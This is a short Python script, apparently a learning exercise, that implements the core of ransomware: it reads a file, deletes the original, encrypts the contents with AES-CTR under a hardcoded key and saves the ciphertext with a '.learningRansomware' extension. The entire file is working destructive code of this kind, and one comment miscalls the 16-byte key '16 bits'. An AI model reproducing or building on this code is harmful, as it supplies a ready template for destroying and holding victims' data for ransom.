import os 
import pyaes

# Open the file; 

fileName = "test.txt"
file = open(fileName, "rb")
fileData = file.read()
file.close()

# Remove the file; 

os.remove(fileName)


# Decryption key; 

key = b"learningRansomwa" # Key of 16 bits
aes = pyaes.AESModeOfOperationCTR(key)

# Encrypt the file

cryptData = aes.encrypt(fileData)

# Save the file encrypted;

newFile = fileName + ".learningRansomware"
newFile = open(f'{newFile}', "wb")
newFile.write(cryptData)
newFile.close()

# Finish


